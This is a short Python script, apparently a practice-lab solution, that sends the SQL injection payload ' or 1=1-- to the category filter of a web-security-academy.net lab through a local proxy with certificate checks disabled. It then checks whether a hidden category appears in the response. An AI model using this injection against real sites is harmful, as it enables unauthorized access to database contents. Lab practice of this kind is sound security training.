import requests
import sys
import urllib3

proxies={'http' : "http://127.0.0.1:8080", 'https' : "http://127.0.0.1:8080"}

url="https://0a4200d6036923e681e6987800dc0068.web-security-academy.net/"

filter="filter?category="

payload="' or 1=1--"
r = requests.get(url + filter + payload,verify=False ,proxies=proxies)



if "Adult" in r.text:
    print("yup")